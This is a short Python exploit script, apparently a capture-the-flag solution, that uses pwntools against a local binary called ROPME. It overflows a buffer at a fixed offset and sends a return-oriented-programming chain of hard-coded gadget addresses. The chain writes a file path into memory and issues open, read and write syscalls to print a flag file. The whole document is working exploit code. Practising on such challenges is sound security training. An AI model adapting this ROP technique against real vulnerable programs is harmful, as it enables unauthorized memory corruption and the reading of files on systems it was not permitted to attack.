#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./ROPME")

offset = 376
junk = b"A" * offset

string = b"flag/hello"

payload  = b""
payload += junk

for i in range(0, len(string), 8):
    payload += p64(0x4019c1)                   # pop rdi; ret;
    payload += p64(0x4af000 + i)               # .data
    payload += p64(0x40889e)                   # pop rsi; ret;
    payload += string[i:i+8].ljust(8, b"\x00") # string to write
    payload += p64(0x443bbf)                   # mov qword ptr [rdi], rsi; ret;

payload += p64(0x4019c1) # pop rdi; ret;
payload += p64(0x4af000) # "flag/hello"
payload += p64(0x40889e) # pop rsi; ret;
payload += p64(0x0)      # flags
payload += p64(0x40170f) # pop rdx; ret;
payload += p64(0x0)      # mode
payload += p64(0x447437) # pop rax; ret;
payload += p64(0x2)      # open()
payload += p64(0x415a34) # syscall; ret;
payload += p64(0x4019c1) # pop rdi; ret;
payload += p64(0x3)      # descriptor
payload += p64(0x40889e) # pop rsi; ret;
payload += p64(0x4af000) # .data
payload += p64(0x40170f) # pop rdx; ret;
payload += p64(0x1a)     # len flag
payload += p64(0x43ca29) # xor rax, rax; ret;
payload += p64(0x415a34) # syscall; ret;
payload += p64(0x4019c1) # pop rdi; ret;
payload += p64(0x1)      # stdout
payload += p64(0x40889e) # pop rsi; ret;
payload += p64(0x4af000) # .data
payload += p64(0x40170f) # pop rdx; ret;
payload += p64(0x1a)     # len flag
payload += p64(0x447437) # pop rax; ret;
payload += p64(0x1)      # write()
payload += p64(0x415a34) # syscall; ret;

shell.sendlineafter(b":\n", payload)
shell.recvline()

flag = shell.recvline().strip().decode()
log.info(f"Flag: {flag}")
